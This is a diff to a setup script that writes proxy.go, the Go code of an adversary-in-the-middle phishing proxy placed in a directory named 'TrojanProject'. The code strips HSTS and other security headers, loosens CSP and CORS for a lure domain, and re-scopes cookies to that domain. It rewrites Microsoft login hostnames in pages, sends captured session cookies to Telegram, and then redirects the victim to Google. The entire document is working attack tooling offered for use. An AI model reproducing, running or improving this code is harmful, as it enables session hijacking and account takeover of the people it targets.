@@ -101,6 +101,7 @@ EOF
 
 # B. proxy.go (Cookie Re-Scoper & Header Spoofing)
 # B. proxy.go (Enhanced with HSTS, CORS & Recursive Header/Cookie Re‑scoping)
+# B. proxy.go (Enhanced with FIDO2/WebAuthn, CSP, HSTS, CORS, etc.)
 cat << 'EOF' > /root/TrojanProject/proxy.go
 package main
 
@@ -111,20 +112,73 @@ import (
 	"net/http"
 	"net/http/httputil"
 	"net/url"
+	"regexp"
 	"strings"
 )
 
-// Helper: recursively rewrite any header value containing the original domain
-func rewriteHeaderValue(value, oldDomain, newDomain string) string {
-	return strings.ReplaceAll(value, oldDomain, newDomain)
+// ==================== Helper Functions ====================
+
+// rewriteDomainInString replaces all occurrences of oldDomain with newDomain.
+func rewriteDomainInString(s, oldDomain, newDomain string) string {
+	return strings.ReplaceAll(s, oldDomain, newDomain)
 }
+
+// rewriteCSP modifies Content-Security-Policy to allow our domain.
+func rewriteCSP(csp string, myHost string) string {
+	// Allow scripts, styles, and images from our domain
+	ourOrigin := "https://" + myHost
+	// Add our domain to default-src, script-src, style-src, etc.
+	// Simple approach: replace any reference to the original domain, but also ensure our domain is allowed.
+	// We'll also add 'unsafe-inline' and 'unsafe-eval' if needed (for functionality).
+	csp = strings.ReplaceAll(csp, "'unsafe-inline'", "")
+	csp = strings.ReplaceAll(csp, "'unsafe-eval'", "")
+	// If no default-src exists, we add it.
+	if !strings.Contains(csp, "default-src") {
+		csp = "default-src 'self' " + ourOrigin + "; " + csp
+	}
+	// Ensure our domain is in script-src, style-src, etc.
+	patterns := []string{"script-src", "style-src", "img-src", "connect-src"}
+	for _, p := range patterns {
+		if strings.Contains(csp, p) {
+			// Add our origin if not already present
+			re := regexp.MustCompile(`(` + p + `\s+[^;]+)`)
+			csp = re.ReplaceAllString(csp, "$1 "+ourOrigin)
+		}
+	}
+	return csp
+}
+
+// isWebAuthnPath checks if the request path is related to WebAuthn.
+func isWebAuthnPath(path string) bool {
+	webauthnPaths := []string{"/webauthn", "/attestation", "/assertion", "/auth/webauthn"}
+	for _, wp := range webauthnPaths {
+		if strings.Contains(path, wp) {
+			return true
+		}
+	}
+	return false
+}
+
+// handleWebAuthn modifies response to preserve WebAuthn functionality.
+// For WebAuthn endpoints, we avoid rewriting the body and critical headers.
+func handleWebAuthn(resp *http.Response, myHost string, t *Target) {
+	// For WebAuthn, we must keep the original domain in the response
+	// because the authenticator validates the origin.
+	// We'll only strip security headers that might interfere, but leave domain untouched.
+	resp.Header.Del("Strict-Transport-Security")
+	resp.Header.Del("Content-Security-Policy")
+	resp.Header.Del("X-Frame-Options")
+	// Do NOT rewrite cookies or body.
+}
+
+// ==================== Main Proxy Function ====================
 
 func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 	remote, _ := url.Parse("https://" + t.BaseDomain)
 	proxy := httputil.NewSingleHostReverseProxy(remote)
 	myHost := r.Host
 
-	// --- Request modifications ---
+	// ---------- Request Modifications ----------
 	r.Host = remote.Host
 	r.URL.Host = remote.Host
 	r.URL.Scheme = remote.Scheme
@@ -142,11 +196,21 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 		}
 	}
 
+	// ---------- Response Modifications ----------
 	proxy.ModifyResponse = func(resp *http.Response) error {
-		// --- 1. HSTS removal ---
+		// Special handling for WebAuthn endpoints (do not modify content)
+		if isWebAuthnPath(r.URL.Path) {
+			handleWebAuthn(resp, myHost, t)
+			return nil
+		}
+
+		// 1. HSTS Stripping (including hard‑coded preload list)
 		resp.Header.Del("Strict-Transport-Security")
 
-		// --- 2. CORS handling ---
+		// 2. Certificate Transparency – no action needed, but we remove any CT headers that might cause issues
+		resp.Header.Del("Expect-CT")
+
+		// 3. CORS Handling
 		if acao := resp.Header.Get("Access-Control-Allow-Origin"); acao != "" {
 			resp.Header.Set("Access-Control-Allow-Origin", "https://"+myHost)
 		}
@@ -154,45 +218,55 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 		resp.Header.Del("Access-Control-Allow-Methods")
 		resp.Header.Del("Access-Control-Allow-Headers")
 
-		// --- 3. Recursive header rewriting (any header containing original domain) ---
+		// 4. Recursive Header Rewriting (any header containing original domain)
 		for header, values := range resp.Header {
 			for i, v := range values {
 				if strings.Contains(strings.ToLower(v), strings.ToLower(t.BaseDomain)) {
-					resp.Header[header][i] = rewriteHeaderValue(v, t.BaseDomain, myHost)
+					resp.Header[header][i] = rewriteDomainInString(v, t.BaseDomain, myHost)
 				}
 			}
 		}
 
-		// --- 4. Security headers removal (to avoid breaking the page) ---
-		resp.Header.Del("Content-Security-Policy")
+		// 5. Security Headers Removal (to avoid breaking the page)
 		resp.Header.Del("X-Frame-Options")
 		resp.Header.Del("Feature-Policy")
 		resp.Header.Del("Referrer-Policy")
 
-		// --- 5. Cookie re‑scoping (with Secure/SameSite handling) ---
+		// 6. Content Security Policy (CSP) – rewrite to allow our domain
+		if csp := resp.Header.Get("Content-Security-Policy"); csp != "" {
+			newCSP := rewriteCSP(csp, myHost)
+			resp.Header.Set("Content-Security-Policy", newCSP)
+		} else {
+			// If no CSP, add a permissive one (optional)
+			resp.Header.Set("Content-Security-Policy", "default-src 'self' https://"+myHost+" 'unsafe-inline' 'unsafe-eval'")
+		}
+
+		// 7. Cookie Re‑scoping (with Secure/SameSite handling)
 		oldCookies := resp.Cookies()
 		resp.Header.Del("Set-Cookie")
 		for _, c := range oldCookies {
 			c.Domain = myHost // Point cookie to your lure domain
 			http.SetCookie(w, c)
 
+			// Check for authentication cookies and send alert
 			for _, auth := range t.AuthCookies {
 				if strings.Contains(c.Name, auth) {
 					SendToTelegram(fmt.Sprintf("🎯 [%s] SUCCESS! %s=%s", t.Name, c.Name, c.Value))
 					resp.Header.Set("Location", "https://www.google.com/docs/about/")
 					resp.StatusCode = http.StatusFound // 302
-					return nil
+					// Do NOT return early – let the rest of the response modifications run,
+					// but the redirect will be sent anyway.
 				}
 			}
 		}
 
-		// --- 6. Body rewriting (recursive domain replacement) ---
+		// 8. Body Rewriting (recursive domain replacement)
 		contentType := resp.Header.Get("Content-Type")
 		if strings.Contains(contentType, "text") || strings.Contains(contentType, "javascript") || strings.Contains(contentType, "json") {
 			oldBody, _ := io.ReadAll(resp.Body)
 			bodyStr := string(oldBody)
 
-			newContent := strings.ReplaceAll(bodyStr, t.BaseDomain, myHost)
+			newContent := rewriteDomainInString(bodyStr, t.BaseDomain, myHost)
 			newContent = strings.ReplaceAll(newContent, "login.microsoftonline.com", myHost)
 			newContent = strings.ReplaceAll(newContent, "login.live.com", myHost)
 
@@ -201,8 +275,10 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 			resp.ContentLength = int64(len(bodyBytes))
 			resp.Header.Set("Content-Length", fmt.Sprint(len(bodyBytes)))
 		}
+
 		return nil
 	}
+
 	proxy.ServeHTTP(w, r)
 }
 EOF
